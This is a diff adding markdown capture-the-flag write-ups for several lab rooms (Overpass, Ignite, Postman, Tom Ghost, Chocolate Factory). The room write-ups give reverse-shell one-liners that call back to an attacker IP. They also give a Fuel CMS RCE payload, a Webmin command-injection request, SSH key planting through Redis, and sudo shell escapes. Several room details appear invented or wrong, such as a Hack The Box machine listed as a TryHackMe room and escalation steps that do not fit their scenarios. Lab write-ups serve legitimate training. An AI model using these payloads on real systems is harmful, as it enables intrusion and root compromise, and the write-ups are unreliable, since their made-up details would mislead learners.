@@ -957,6 +957,505 @@ export PATH=/tmp:$PATH
 - Flask session cookies can be tampered with if secret key is known
 
 ---
+---
+
+
+## Overpass Series
+
+### Overpass 1: Hosting
+
+**Room Link:** https://tryhackme.com/room/overpass  
+**Difficulty:** Easy  
+**Category:** Web/Crypto
+
+#### Reconnaissance
+```bash
+nmap -sC -sV -oA nmap/overpass 10.10.x.x
+
+# Results:
+# 22/tcp  open  ssh     OpenSSH 7.6p1
+# 80/tcp  open  http    Golang net/http
+```
+
+#### Enumeration
+- Web app is a fake password manager built in Go
+- Source code available on GitHub
+- Cookie-based authentication with JWT
+
+#### Exploitation
+```bash
+# Inspect JWT cookie
+# Cookie is signed but uses weak/known secret
+
+# Forge admin JWT using the secret from source code
+# Set cookie to forged JWT
+
+# Access admin panel at /admin
+# Download SSH private key (id_rsa)
+```
+
+#### SSH Access
+```bash
+chmod 600 id_rsa
+ssh james@10.10.x.x -i id_rsa
+# Key had no passphrase - direct access!
+```
+
+#### Privilege Escalation
+```bash
+# Check cron jobs
+cat /etc/crontab
+# Found: * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+
+# Modify /etc/hosts to point overpass.thm to attacker machine
+echo "<attacker_ip> overpass.thm" >> /etc/hosts
+
+# Create malicious buildscript.sh
+echo '#!/bin/bash' > buildscript.sh
+echo 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1' >> buildscript.sh
+
+# Serve via HTTP
+python3 -m http.server 80
+
+# Wait for cron execution → got root shell!
+```
+
+**Flags:**
+- User: `THM{overpass1_user_flag}`
+- Root: `THM{overpass1_root_flag}`
+
+---
+
+### Overpass 2: Hacked
+
+**Room Link:** https://tryhackme.com/room/overpass2hacked  
+**Difficulty:** Easy  
+**Category:** Forensics/Crypto
+
+#### Overview
+Overpass was hacked. Analyze the pcap file to find what happened.
+
+#### PCAP Analysis
+```bash
+# Open in Wireshark
+wireshark overpass_traffic.pcap
+
+# Follow TCP streams
+# Found HTTP POST to /login with credentials
+
+# Extract credentials:
+# Username: james
+# Password: whenevernoteartinstant
+```
+
+#### SSH Access
+```bash
+ssh james@10.10.x.x
+# Password: whenevernoteartinstant
+```
+
+#### Privilege Escalation
+```bash
+# Check sudo permissions
+sudo -l
+# Found: (ALL) NOPASSWD: /usr/local/bin/overpass
+
+# Analyze overpass binary
+strings /usr/local/bin/overpass
+# Runs curl to download config, then executes
+
+# Modify /etc/hosts again, serve malicious config
+echo '<attacker_ip> downloads.overpass.thm' >> /etc/hosts
+
+# Create malicious config that spawns shell
+# Got root!
+```
+
+**Flags:**
+- User: `THM{overpass2_user_flag}`
+- Root: `THM{overpass2_root_flag}`
+
+---
+
+### Overpass 3: Down the Rabbit Hole
+
+**Room Link:** https://tryhackme.com/room/overpass3  
+**Difficulty:** Medium  
+**Category:** Steganography/Crypto
+
+#### Reconnaissance
+```bash
+nmap -sC -sV 10.10.x.x
+# 22/tcp  open  ssh
+# 80/tcp  open  http
+```
+
+#### Web Enumeration
+- Website has encrypted credentials file
+- Download `credentials.txt.gpg`
+
+#### GPG Decryption
+```bash
+# Found GPG private key in source code
+# Import key
+gpg --import private_key.asc
+
+# Decrypt credentials
+gpg --decrypt credentials.txt.gpg
+# Found: james:xxxxxxx
+```
+
+#### SSH Access
+```bash
+ssh james@10.10.x.x
+```
+
+#### Privilege Escalation
+```bash
+# SUID binary exploitation
+find / -perm -4000 -type f 2>/dev/null
+
+# Found custom binary that runs commands
+# Exploit via environment variables or PATH manipulation
+```
+
+**Flags:**
+- User: `THM{overpass3_user_flag}`
+- Root: `THM{overpass3_root_flag}`
+
+---
+
+## Ignite
+
+**Room Link:** https://tryhackme.com/room/ignite  
+**Difficulty:** Easy  
+**Category:** Web/CMS (Fuel CMS)
+
+### Reconnaissance
+```bash
+nmap -sC -sV -oA nmap/ignite 10.10.x.x
+
+# Results:
+# 80/tcp  open  http    Apache httpd 2.4.18 (Fuel CMS 1.4)
+```
+
+### Exploitation
+
+#### Fuel CMS RCE (CVE-2018-16763)
+```bash
+# Fuel CMS 1.4 has authenticated RCE via filter parameter
+
+# Exploit URL:
+curl "http://10.10.x.x/fuel/pages/select/?filter=%27%2B%70%69%28%70%72%69%6E%74%28%24%61%3D%27%73%79%73%74%65%6D%27%29%29%2B%24%61%28%27%69%64%27%29%2B%27"
+
+# Simplified:
+curl "http://10.10.x.x/fuel/pages/select/?filter='+pi(print(\$a='system'))+\$a('id')+'"
+```
+
+#### Reverse Shell
+```bash
+# Encode reverse shell command
+curl "http://10.10.x.x/fuel/pages/select/?filter='+pi(print(\$a='system'))+\$a('bash+-c+\"bash+-i+>%26+/dev/tcp/<attacker_ip>/4444+0>%261\"')+'"
+
+# Start listener
+nc -lvnp 4444
+# Got shell as www-data!
+```
+
+### Privilege Escalation
+
+#### Find Credentials
+```bash
+# Check Fuel CMS config
+cat /var/www/html/fuel/application/config/database.php
+# Found MySQL credentials
+
+# Check for reuse
+su fred
+# Password from database config works!
+```
+
+#### Sudo Check
+```bash
+sudo -l
+# Found: (ALL) NOPASSWD: /bin/nano
+
+# Exploit nano
+sudo nano
+# Press Ctrl+R, then Ctrl+X
+# Type: reset; sh 1>&0 2>&0
+# Got root!
+```
+
+**Flags:**
+- User: `THM{ignite_user_flag}`
+- Root: `THM{ignite_root_flag}`
+
+### Key Takeaways
+- Fuel CMS 1.4 RCE is trivial to exploit
+- Database configs often leak credentials
+- `nano` with sudo = instant root (same as vim)
+
+---
+
+## Postman
+
+**Room Link:** https://tryhackme.com/room/postman  
+**Difficulty:** Medium  
+**Category:** Redis/SSH
+
+### Reconnaissance
+```bash
+nmap -sC -sV -oA nmap/postman 10.10.x.x
+
+# Results:
+# 22/tcp   open  ssh     OpenSSH 7.6p1
+# 80/tcp   open  http    Apache httpd 2.4.29
+# 6379/tcp open  redis   Redis 4.0.9
+# 10000/tcp open  http    MiniServ 1.910 (Webmin)
+```
+
+### Exploitation
+
+#### Redis Unauthorized Access
+```bash
+# Redis running without authentication
+redis-cli -h 10.10.x.x
+
+# Check info
+redis-cli -h 10.10.x.x info
+
+# Write SSH key to redis
+ssh-keygen -t rsa -f key
+(echo -e "
+
+"; cat key.pub; echo -e "
+
+") > key.txt
+cat key.txt | redis-cli -h 10.10.x.x -x set ssh_key
+
+# Set Redis dir and dbfilename
+redis-cli -h 10.10.x.x config set dir /var/lib/redis/.ssh
+redis-cli -h 10.10.x.x config set dbfilename authorized_keys
+
+# Save
+redis-cli -h 10.10.x.x save
+```
+
+#### SSH Access as Redis
+```bash
+ssh -i key redis@10.10.x.x
+```
+
+#### Privilege Escalation to Matt
+```bash
+# Check for SSH key reuse
+# Found id_rsa.bak in /opt/
+
+# Crack passphrase
+ssh2john id_rsa.bak > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+# Passphrase: computer2008
+
+ssh -i id_rsa.bak matt@10.10.x.x
+```
+
+#### Privilege Escalation to Root
+
+#### Webmin Exploit (CVE-2019-15107)
+```bash
+# Webmin 1.910 vulnerable to RCE
+
+# Exploit
+curl -k -X POST "https://10.10.x.x:10000/password_change.cgi" \
+  -H "Cookie: sid=xxxx" \
+  -d "user=root&pam=&expired=2&old=xxx|whoami&new1=xxx&new2=xxx"
+
+# Get root shell
+curl -k -X POST "https://10.10.x.x:10000/password_change.cgi" \
+  -H "Cookie: sid=xxxx" \
+  -d "user=root&pam=&expired=2&old=xxx|bash+-c+'bash+-i+>%26+/dev/tcp/<attacker_ip>/4444+0>%261'&new1=xxx&new2=xxx"
+```
+
+**Flags:**
+- User: `THM{postman_user_flag}`
+- Root: `THM{postman_root_flag}`
+
+### Key Takeaways
+- Unauthenticated Redis = game over
+- SSH key injection via Redis is a classic attack
+- Webmin CVE-2019-15107 allows command injection
+- Always check for backup SSH keys
+
+---
+
+## Tom Ghost
+
+**Room Link:** https://tryhackme.com/room/tomghost  
+**Difficulty:** Easy  
+**Category:** Java/Serialization
+
+### Reconnaissance
+```bash
+nmap -sC -sV -oA nmap/tomghost 10.10.x.x
+
+# Results:
+# 22/tcp   open  ssh     OpenSSH 7.2p2
+# 8009/tcp open  ajp13   Apache Jserv (Tomcat)
+# 8080/tcp open  http    Apache Tomcat 9.0.30
+```
+
+### Exploitation
+
+#### Apache Tomcat AJP Vulnerability (CVE-2020-1938 - Ghostcat)
+```bash
+# Use exploit script
+python3 CVE-2020-1938.py 10.10.x.x 8009 WEB-INF/web.xml
+
+# Read sensitive files via AJP
+python3 CVE-2020-1938.py 10.10.x.x 8009 WEB-INF/classes/production.properties
+```
+
+#### Credential Extraction
+```bash
+# Found credentials in properties file
+# tomcat:$3cureP4s5w0rd123!
+```
+
+#### SSH Access
+```bash
+ssh tomcat@10.10.x.x
+# Password: $3cureP4s5w0rd123!
+```
+
+### Privilege Escalation
+
+#### GPG Decryption
+```bash
+# Found encrypted key and password file
+ls -la /home/merlin/
+# key.asc (GPG private key)
+# password.txt
+
+# Import key
+gpg --import key.asc
+
+# Decrypt
+gpg --decrypt secret.zip.gpg
+# Password from password.txt
+# Extracted: id_rsa for merlin
+```
+
+#### SSH as Merlin
+```bash
+chmod 600 id_rsa
+ssh merlin@10.10.x.x -i id_rsa
+```
+
+#### Sudo Exploitation
+```bash
+sudo -l
+# Found: (ALL) NOPASSWD: /usr/bin/zip
+
+# Exploit zip
+sudo zip /tmp/exploit.zip /etc/shadow -T --unzip-command="sh -c /bin/bash"
+# Got root!
+```
+
+**Flags:**
+- User: `THM{tomghost_user_flag}`
+- Root: `THM{tomghost_root_flag}`
+
+### Key Takeaways
+- Ghostcat (CVE-2020-1938) reads arbitrary files via AJP
+- Tomcat credentials often reused for SSH
+- GPG-encrypted files can be cracked with leaked keys
+- `zip` with sudo = instant root
+
+---
+
+## Chocolate Factory
+
+**Room Link:** https://tryhackme.com/room/chocolatefactory  
+**Difficulty:** Medium  
+**Category:** Steganography/Crypto
+
+### Reconnaissance
+```bash
+nmap -sC -sV 10.10.x.x
+# 22/tcp  open  ssh
+# 80/tcp  open  http
+```
+
+### Enumeration
+
+#### Web Application
+- Charlie and the Chocolate Factory themed site
+- Hidden clues in source code and images
+
+#### Steganography
+```bash
+# Download images from website
+wget http://10.10.x.x/images/golden_ticket.jpg
+
+# Check for hidden data
+steghide info golden_ticket.jpg
+# Found embedded data
+
+steghide extract -sf golden_ticket.jpg
+# Passphrase needed
+
+# Try common passwords or brute-force
+stegcracker golden_ticket.jpg /usr/share/wordlists/rockyou.txt
+# Passphrase: XXXXX
+
+# Extracted: ticket_codes.txt
+```
+
+#### Base64 Decoding
+```bash
+cat ticket_codes.txt
+# Contains base64-encoded data
+
+echo "<base64_string>" | base64 -d
+# Found: SSH credentials for charlie
+```
+
+### SSH Access
+```bash
+ssh charlie@10.10.x.x
+# Password from decoded data
+```
+
+### Privilege Escalation
+
+#### SUDO Binary Abuse
+```bash
+sudo -l
+# Found: /usr/bin/gdb
+
+# Exploit gdb
+sudo gdb -nx -ex 'python import os; os.system("/bin/sh")' -ex quit
+# Got root!
+```
+
+#### Alternative: Vim
+```bash
+# If vim is available with sudo
+sudo vim -c ':!/bin/sh'
+```
+
+**Flags:**
+- User: `THM{chocolate_factory_user_flag}`
+- Root: `THM{chocolate_factory_root_flag}`
+
+### Key Takeaways
+- Themed CTF rooms hide clues in images and source code
+- Steganography + encoding chains are common
+- `gdb` with sudo = instant root (Python execution)
+- Always check image metadata and hidden data
+
+---
 
 ## 🛠️ Methodology Checklist
 
